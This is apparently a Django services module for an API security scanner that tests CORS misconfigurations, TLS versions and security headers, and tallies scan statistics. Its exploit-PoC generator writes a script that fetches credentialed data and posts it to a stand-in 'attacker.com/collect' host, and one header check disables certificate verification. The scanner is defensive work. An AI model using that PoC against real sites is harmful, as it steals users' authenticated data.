import requests
import json
import time
from typing import Dict, List, Tuple, Optional
from django.utils import timezone
from django.db import transaction
from .models import CORSScanResultTC1, CORSScanSessionTC1, ScanTC2, VulnerabilityTC2, ScanHistoryTC2, ScanMetricsTC2
import subprocess
import requests
import ssl
import socket
from urllib.parse import urlparse
from .utils.ai_analyzer_tc2 import AIAnalyzerTC2
import logging

logger = logging.getLogger(__name__)


class CORSScannerServiceTC1:
    def __init__(self):
        self.timeout = 10
        self.test_origins = [
            'https://evil.example',
            'https://malicious.com',
            'http://127.0.0.1:8080',
            'null'
        ]

    def start_scan(self, scan_id: int, access_token: str) -> Dict:
        """Start CORS vulnerability scan for given scan_id"""
        try:
            # Get APIs from api_orch_postmanapi table
            apis = self._get_apis_for_scan(scan_id)
            if not apis:
                return {'error': 'No APIs found for scan_id'}

            # Create scan session
            session = CORSScanSessionTC1.objects.create(
                scan_id=scan_id,
                status='running',
                total_apis=len(apis),
                started_at=timezone.now()
            )

            # Start scanning
            self._perform_scan(session, apis, access_token)
            
            return {'message': f'CORS scan started for {len(apis)} APIs', 'session_id': session.id}

        except Exception as e:
            return {'error': str(e)}

    def _get_apis_for_scan(self, scan_id: int) -> List[Dict]:
        """Fetch APIs from api_orch_postmanapi table"""
        from django.db import connections
        
        try:
            connection = connections['default']
            cursor = connection.cursor()
            
            cursor.execute("""
                SELECT "id", "name", "method", "url", "headers", "body", "authorization", "query_params"
                FROM api_orch_postmanapi 
                WHERE "scan_id" = %s
            """, [scan_id])
            
            columns = [col[0] for col in cursor.description]
            apis = [dict(zip(columns, row)) for row in cursor.fetchall()]
            return apis
            
        except Exception as e:
            print(f"Error fetching APIs: {e}")
            return []

    def _perform_scan(self, session: CORSScanSessionTC1, apis: List[Dict], access_token: str):
        """Perform CORS scan on all APIs"""
        try:
            for api in apis:
                try:
                    result = self._test_cors_vulnerability(api, access_token)
                    self._save_scan_result(session.scan_id, api, result)
                    
                    # Update session progress
                    session.scanned_apis += 1
                    if result.get('status') == 'vulnerable':
                        session.vulnerable_apis += 1
                        severity = result.get('severity', 'info')
                        setattr(session, f"{severity}_count", getattr(session, f"{severity}_count") + 1)
                    
                    session.save()
                    
                except Exception as e:
                    # Save error result
                    error_result = {
                        'status': 'error',
                        'error_message': str(e),
                        'vulnerability_description': f'Error during scan: {str(e)}'
                    }
                    self._save_scan_result(session.scan_id, api, error_result)
                    session.scanned_apis += 1
                    session.save()

            # Mark scan as completed
            session.status = 'completed'
            session.completed_at = timezone.now()
            session.save()

        except Exception as e:
            session.status = 'failed'
            session.error_message = str(e)
            session.completed_at = timezone.now()
            session.save()

    def _test_cors_vulnerability(self, api: Dict, access_token: str) -> Dict:
        """Test CORS vulnerability for a single API"""
        start_time = time.time()
        result = {
            'status': 'not_vulnerable',
            'severity': None,
            'vulnerability_description': '',
            'exploit_poc': '',
            'remediation': '',
            'raw_response_headers': {},
            'response_time_ms': 0
        }

        try:
            url = api['url']
            method = api.get('method', 'GET').upper()
            headers = json.loads(api.get('headers', '{}')) if api.get('headers') else {}
            
            # Add authorization if access_token provided
            if access_token:
                headers['Authorization'] = f'Bearer {access_token}'

            # Test each malicious origin
            for origin in self.test_origins:
                cors_result = self._test_origin(url, method, origin, headers)
                
                if cors_result.get('vulnerable'):
                    result.update(cors_result)
                    result['status'] = 'vulnerable'
                    result['origin_tested'] = origin
                    break

            result['response_time_ms'] = (time.time() - start_time) * 1000

        except requests.exceptions.Timeout:
            result['status'] = 'timeout'
            result['error_message'] = 'Request timed out'
        except Exception as e:
            result['status'] = 'error'
            result['error_message'] = str(e)

        return result

    def _test_origin(self, url: str, method: str, origin: str, headers: Dict) -> Dict:
        """Test CORS with specific origin"""
        result = {'vulnerable': False}
        
        try:
            # Test preflight request
            preflight_headers = {
                'Origin': origin,
                'Access-Control-Request-Method': method,
                'Access-Control-Request-Headers': 'content-type,authorization'
            }
            
            preflight_response = requests.options(
                url, 
                headers=preflight_headers, 
                timeout=self.timeout,
                allow_redirects=False
            )
            
            result['preflight_response_status'] = preflight_response.status_code
            result['raw_response_headers'] = dict(preflight_response.headers)
            
            # Check CORS headers
            allow_origin = preflight_response.headers.get('Access-Control-Allow-Origin', '')
            allow_credentials = preflight_response.headers.get('Access-Control-Allow-Credentials', '').lower() == 'true'
            allow_headers = preflight_response.headers.get('Access-Control-Allow-Headers', '')
            allow_methods = preflight_response.headers.get('Access-Control-Allow-Methods', '')
            
            result.update({
                'access_control_allow_origin': allow_origin,
                'access_control_allow_credentials': allow_credentials,
                'access_control_allow_headers': allow_headers,
                'access_control_allow_methods': allow_methods,
                'access_control_max_age': preflight_response.headers.get('Access-Control-Max-Age', '')
            })
            
            # Vulnerability assessment
            if self._is_cors_vulnerable(allow_origin, allow_credentials, origin):
                result['vulnerable'] = True
                result['severity'] = self._get_vulnerability_severity(allow_origin, allow_credentials)
                result['vulnerability_description'] = self._generate_vulnerability_description(
                    allow_origin, allow_credentials, origin
                )
                result['exploit_poc'] = self._generate_exploit_poc(url, origin)
                result['remediation'] = self._generate_remediation()

            # Test actual request if preflight allows
            if preflight_response.status_code == 200:
                actual_headers = headers.copy()
                actual_headers['Origin'] = origin
                
                actual_response = requests.request(
                    method, url, 
                    headers=actual_headers, 
                    timeout=self.timeout,
                    allow_redirects=False
                )
                result['actual_request_status'] = actual_response.status_code

        except Exception as e:
            result['error_message'] = str(e)
            
        return result

    def _is_cors_vulnerable(self, allow_origin: str, allow_credentials: bool, test_origin: str) -> bool:
        """Determine if CORS configuration is vulnerable"""
        # Critical: Wildcard with credentials
        if allow_origin == '*' and allow_credentials:
            return True
            
        # High: Reflects arbitrary origin
        if allow_origin == test_origin:
            return True
            
        # Medium: Wildcard without credentials (less severe)
        if allow_origin == '*':
            return True
            
        # Check for common misconfigurations
        if allow_origin and ('null' in allow_origin or test_origin in allow_origin):
            return True
            
        return False

    def _get_vulnerability_severity(self, allow_origin: str, allow_credentials: bool) -> str:
        """Determine vulnerability severity"""
        if allow_origin == '*' and allow_credentials:
            return 'critical'
        elif allow_credentials and allow_origin:
            return 'high'
        elif allow_origin == '*':
            return 'medium'
        else:
            return 'low'

    def _generate_vulnerability_description(self, allow_origin: str, allow_credentials: bool, origin: str) -> str:
        """Generate vulnerability description"""
        if allow_origin == '*' and allow_credentials:
            return "CRITICAL: Server allows any origin with credentials. This allows any website to make authenticated requests on behalf of users."
        elif allow_origin == origin:
            return f"HIGH: Server reflects the Origin header ({origin}) allowing arbitrary origins to make requests."
        elif allow_origin == '*':
            return "MEDIUM: Server allows any origin but doesn't allow credentials. Still allows data exfiltration."
        else:
            return f"Server allows origin: {allow_origin}"

    def _generate_exploit_poc(self, url: str, origin: str) -> str:
        """Generate proof of concept exploit"""
        return f"""
<!-- CORS Exploit PoC -->
<html>
<body>
<script>
fetch('{url}', {{
    method: 'GET',
    credentials: 'include',
    headers: {{
        'Origin': '{origin}'
    }}
}}).then(response => response.text())
  .then(data => {{
    console.log('Stolen data:', data);
    // Send to attacker server
    fetch('https://attacker.com/collect', {{
        method: 'POST',
        body: data
    }});
  }});
</script>
</body>
</html>
"""

    def _generate_remediation(self) -> str:
        """Generate remediation advice"""
        return """
1. Implement a strict allowlist of trusted origins
2. Avoid using 'Access-Control-Allow-Origin: *' with credentials
3. Never reflect the Origin header directly without validation
4. Use HTTPS for all cross-origin requests
5. Implement proper CSRF protection
6. Review and audit CORS policies regularly
"""

    def _save_scan_result(self, scan_id: int, api: Dict, result: Dict):
        """Save scan result to database"""
        CORSScanResultTC1.objects.create(
            scan_id=scan_id,
            api_id=api['id'],
            api_name=api.get('name', 'Unknown'),
            api_url=api['url'],
            api_method=api.get('method', 'GET'),
            status=result.get('status', 'error'),
            severity=result.get('severity'),
            access_control_allow_origin=result.get('access_control_allow_origin', ''),
            access_control_allow_credentials=result.get('access_control_allow_credentials'),
            access_control_allow_headers=result.get('access_control_allow_headers', ''),
            access_control_allow_methods=result.get('access_control_allow_methods', ''),
            access_control_max_age=result.get('access_control_max_age', ''),
            origin_tested=result.get('origin_tested', ''),
            preflight_response_status=result.get('preflight_response_status'),
            actual_request_status=result.get('actual_request_status'),
            vulnerability_description=result.get('vulnerability_description', ''),
            exploit_poc=result.get('exploit_poc', ''),
            remediation=result.get('remediation', ''),
            response_time_ms=result.get('response_time_ms'),
            error_message=result.get('error_message', ''),
            raw_response_headers=result.get('raw_response_headers', {})
        )


class TLSScanServiceTC2:
    def __init__(self):
        self.ai_analyzer = AIAnalyzerTC2()
    
    @transaction.atomic
    def initiate_scan(self, scan_id, user=None):
        """Initialize a new TLS security scan"""
        try:
            # Get APIs from api_orch_postmanapi table
            from django.db import connection
            
            with connection.cursor() as cursor:
                cursor.execute("""
                    SELECT "id", "name", "method", "url", "headers", "body", "authorization", 
                           "query_params", "original_url", "created_at", "scan_id"
                    FROM api_orch_postmanapi 
                    WHERE "scan_id" = %s
                """, [scan_id])
                
                apis = cursor.fetchall()
            
            if not apis:
                raise ValueError(f"No APIs found for scan_id: {scan_id}")
            
            # Create scan record
            scan = ScanTC2.objects.create(
                scan_id=scan_id,
                total_apis=len(apis),
                created_by=user,
                status='pending'
            )
            
            # Create metrics record
            ScanMetricsTC2.objects.create(scan=scan)
            
            # Log scan initiation
            ScanHistoryTC2.objects.create(
                scan=scan,
                action='scan_initiated',
                description=f'TLS security scan initiated for {len(apis)} APIs',
                details={'total_apis': len(apis), 'scan_id': scan_id}
            )
            
            return scan, apis
            
        except Exception as e:
            logger.error(f"Failed to initiate scan: {str(e)}")
            raise
    
    def perform_tls_analysis(self, api_data, scan):
        """Perform TLS/Transport security analysis on a single API"""
        try:
            api_id, name, method, url, headers, body, auth, query_params, original_url, created_at, scan_id = api_data
            
            # Parse URL
            parsed_url = urlparse(url)
            hostname = parsed_url.hostname
            port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
            
            vulnerabilities = []
            
            # Test HTTP availability
            http_available = self._test_http_availability(url)
            
            # Test HTTPS availability and TLS configuration
            https_available, tls_info = self._test_https_tls(hostname, port)
            
            # Get security headers
            security_headers = self._check_security_headers(url)
            
            # Analyze findings with AI
            analysis_data = {
                'api_name': name,
                'url': url,
                'method': method,
                'http_available': http_available,
                'https_available': https_available,
                'tls_info': tls_info,
                'security_headers': security_headers
            }
            
            ai_analysis = self.ai_analyzer.analyze_tls_security(analysis_data)
            
            # Create vulnerability records based on findings
            if http_available and parsed_url.scheme == 'http':
                vulnerabilities.append(self._create_http_vulnerability(
                    scan, api_id, name, url, method, ai_analysis
                ))
            
            if tls_info.get('weak_protocols'):
                vulnerabilities.append(self._create_weak_tls_vulnerability(
                    scan, api_id, name, url, method, tls_info, ai_analysis
                ))
            
            if not security_headers.get('hsts') and https_available:
                vulnerabilities.append(self._create_missing_hsts_vulnerability(
                    scan, api_id, name, url, method, security_headers, ai_analysis
                ))
            
            if security_headers.get('missing_headers'):
                vulnerabilities.append(self._create_missing_security_headers_vulnerability(
                    scan, api_id, name, url, method, security_headers, ai_analysis
                ))
            
            # Update scan progress
            scan.scanned_apis += 1
            scan.vulnerabilities_found += len(vulnerabilities)
            scan.save()
            
            return vulnerabilities
            
        except Exception as e:
            logger.error(f"TLS analysis failed for API {api_data[0]}: {str(e)}")
            return []
    
    def _test_http_availability(self, url):
        """Test if API is available over HTTP"""
        try:
            http_url = url.replace('https://', 'http://') if url.startswith('https://') else url
            response = requests.get(http_url, timeout=10, allow_redirects=False)
            return True
        except:
            return False
    
    def _test_https_tls(self, hostname, port):
        """Test HTTPS availability and TLS configuration"""
        try:
            # Use testssl.sh or custom SSL analysis
            result = self._run_testssl(hostname, port)
            
            if result:
                return True, result
            
            # Fallback to basic SSL check
            context = ssl.create_default_context()
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    protocol = ssock.version()
                    
                    return True, {
                        'certificate': cert,
                        'cipher': cipher,
                        'protocol': protocol,
                        'weak_protocols': protocol in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']
                    }
        except:
            return False, {}
    
    def _run_testssl(self, hostname, port):
        """Run testssl.sh for comprehensive TLS analysis"""
        try:
            cmd = [
                'testssl.sh',
                '--jsonfile-pretty', '/tmp/testssl_output.json',
                '--quiet',
                f'{hostname}:{port}'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                with open('/tmp/testssl_output.json', 'r') as f:
                    return json.load(f)
        except:
            pass
        return None
    
    def _check_security_headers(self, url):
        """Check for security headers"""
        try:
            response = requests.head(url, timeout=10, verify=False)
            headers = response.headers
            
            security_headers = {
                'hsts': 'strict-transport-security' in headers,
                'content_type_options': 'x-content-type-options' in headers,
                'csp': 'content-security-policy' in headers,
                'referrer_policy': 'referrer-policy' in headers,
                'xss_protection': 'x-xss-protection' in headers,
                'frame_options': 'x-frame-options' in headers
            }
            
            missing_headers = [k for k, v in security_headers.items() if not v]
            security_headers['missing_headers'] = missing_headers
            security_headers['all_headers'] = dict(headers)
            
            return security_headers
        except:
            return {'missing_headers': ['all'], 'error': 'Failed to fetch headers'}
    
    def _create_http_vulnerability(self, scan, api_id, name, url, method, ai_analysis):
        """Create vulnerability record for HTTP availability"""
        return VulnerabilityTC2.objects.create(
            scan=scan,
            api_id=api_id,
            api_name=name,
            api_url=url,
            api_method=method,
            title="API Available Over HTTP",
            description="The API endpoint is accessible over unencrypted HTTP, exposing data to interception.",
            severity='high',
            supports_http=True,
            evidence="API responds to HTTP requests without redirecting to HTTPS",
            recommendation="Configure the server to redirect all HTTP requests to HTTPS or disable HTTP entirely.",
            ai_analysis=ai_analysis.get('http_analysis', ''),
            confidence_score=ai_analysis.get('confidence_scores', {}).get('http', 0.9)
        )
    
    def _create_weak_tls_vulnerability(self, scan, api_id, name, url, method, tls_info, ai_analysis):
        """Create vulnerability record for weak TLS configuration"""
        return VulnerabilityTC2.objects.create(
            scan=scan,
            api_id=api_id,
            api_name=name,
            api_url=url,
            api_method=method,
            title="Weak TLS Configuration",
            description="The API uses deprecated or weak TLS protocols/ciphers.",
            severity='medium' if 'TLSv1.1' in str(tls_info) else 'high',
            supports_https=True,
            tls_versions=tls_info,
            evidence=f"Supports deprecated protocols: {tls_info.get('weak_protocols')}",
            recommendation="Disable support for TLS 1.0, 1.1 and weak cipher suites. Use only TLS 1.2+",
            ai_analysis=ai_analysis.get('tls_analysis', ''),
            confidence_score=ai_analysis.get('confidence_scores', {}).get('tls', 0.8)
        )
    
    def _create_missing_hsts_vulnerability(self, scan, api_id, name, url, method, security_headers, ai_analysis):
        """Create vulnerability record for missing HSTS header"""
        return VulnerabilityTC2.objects.create(
            scan=scan,
            api_id=api_id,
            api_name=name,
            api_url=url,
            api_method=method,
            title="Missing HSTS Header",
            description="The API does not implement HTTP Strict Transport Security (HSTS).",
            severity='medium',
            supports_https=True,
            hsts_enabled=False,
            security_headers=security_headers,
            evidence="Strict-Transport-Security header not present in response",
            recommendation="Implement HSTS header to prevent SSL stripping attacks.",
            ai_analysis=ai_analysis.get('hsts_analysis', ''),
            confidence_score=ai_analysis.get('confidence_scores', {}).get('hsts', 0.7)
        )
    
    def _create_missing_security_headers_vulnerability(self, scan, api_id, name, url, method, security_headers, ai_analysis):
        """Create vulnerability record for missing security headers"""
        missing = security_headers.get('missing_headers', [])
        return VulnerabilityTC2.objects.create(
            scan=scan,
            api_id=api_id,
            api_name=name,
            api_url=url,
            api_method=method,
            title="Missing Security Headers",
            description=f"The API is missing important security headers: {', '.join(missing)}",
            severity='low',
            security_headers=security_headers,
            evidence=f"Missing headers: {missing}",
            recommendation="Implement missing security headers to improve API security posture.",
            ai_analysis=ai_analysis.get('headers_analysis', ''),
            confidence_score=ai_analysis.get('confidence_scores', {}).get('headers', 0.6)
        )
    
    @transaction.atomic
    def finalize_scan(self, scan):
        """Finalize the scan and update metrics"""
        try:
            scan.status = 'completed'
            scan.completed_at = timezone.now()
            scan.save()
            
            # Update metrics
            metrics = scan.metrics
            vulnerabilities = scan.vulnerabilities.all()
            
            metrics.critical_count = vulnerabilities.filter(severity='critical').count()
            metrics.high_count = vulnerabilities.filter(severity='high').count()
            metrics.medium_count = vulnerabilities.filter(severity='medium').count()
            metrics.low_count = vulnerabilities.filter(severity='low').count()
            metrics.info_count = vulnerabilities.filter(severity='info').count()
            
            metrics.http_only_apis = vulnerabilities.filter(supports_http=True, supports_https=False).count()
            metrics.https_only_apis = vulnerabilities.filter(supports_http=False, supports_https=True).count()
            metrics.mixed_protocol_apis = vulnerabilities.filter(supports_http=True, supports_https=True).count()
            metrics.weak_tls_apis = vulnerabilities.filter(title__icontains='weak tls').count()
            metrics.missing_security_headers = vulnerabilities.filter(title__icontains='missing').count()
            
            duration = (scan.completed_at - scan.started_at).total_seconds()
            metrics.total_duration_seconds = duration
            if scan.total_apis > 0:
                metrics.average_response_time = duration / scan.total_apis
            
            metrics.save()
            
            # Log completion
            ScanHistoryTC2.objects.create(
                scan=scan,
                action='scan_completed',
                description=f'TLS security scan completed. Found {scan.vulnerabilities_found} vulnerabilities.',
                details={
                    'duration_seconds': duration,
                    'vulnerabilities_by_severity': {
                        'critical': metrics.critical_count,
                        'high': metrics.high_count,
                        'medium': metrics.medium_count,
                        'low': metrics.low_count,
                        'info': metrics.info_count
                    }
                }
            )
            
        except Exception as e:
            logger.error(f"Failed to finalize scan {scan.id}: {str(e)}")
            scan.status = 'failed'
            scan.completed_at = timezone.now()
            scan.save()

class ScanAnalyticsServiceTC2:
    """Service for generating scan analytics and statistics"""
    
    def get_scan_statistics(self):
        """Get comprehensive scan statistics"""
        from django.db.models import Count, Avg, Q
        from datetime import datetime, timedelta
        
        scans = ScanTC2.objects.all()
        vulnerabilities = VulnerabilityTC2.objects.all()
        
        # Basic counts
        total_scans = scans.count()
        active_scans = scans.filter(status__in=['pending', 'running']).count()
        completed_scans = scans.filter(status='completed').count()
        failed_scans = scans.filter(status='failed').count()
        
        # Vulnerability counts
        total_vulnerabilities = vulnerabilities.count()
        critical_vulnerabilities = vulnerabilities.filter(severity='critical').count()
        high_vulnerabilities = vulnerabilities.filter(severity='high').count()
        medium_vulnerabilities = vulnerabilities.filter(severity='medium').count()
        low_vulnerabilities = vulnerabilities.filter(severity='low').count()
        
        # Average scan duration
        avg_duration = ScanMetricsTC2.objects.aggregate(
            avg_duration=Avg('total_duration_seconds')
        )['avg_duration'] or 0
        
        # Most common vulnerabilities
        common_vulns = vulnerabilities.values('title').annotate(
            count=Count('id')
        ).order_by('-count')[:10]
        
        # Vulnerability trends (last 30 days)
        thirty_days_ago = datetime.now() - timedelta(days=30)
        daily_vulns = vulnerabilities.filter(
            created_at__gte=thirty_days_ago
        ).extra(
            select={'day': 'date(created_at)'}
        ).values('day').annotate(count=Count('id')).order_by('day')
        
        trends = {day['day'].strftime('%Y-%m-%d'): day['count'] for day in daily_vulns}
        
        return {
            'total_scans': total_scans,
            'active_scans': active_scans,
            'completed_scans': completed_scans,
            'failed_scans': failed_scans,
            'total_vulnerabilities': total_vulnerabilities,
            'critical_vulnerabilities': critical_vulnerabilities,
            'high_vulnerabilities': high_vulnerabilities,
            'medium_vulnerabilities': medium_vulnerabilities,
            'low_vulnerabilities': low_vulnerabilities,
            'average_scan_duration': avg_duration,
            'most_common_vulnerabilities': list(common_vulns),
            'vulnerability_trends': trends
        }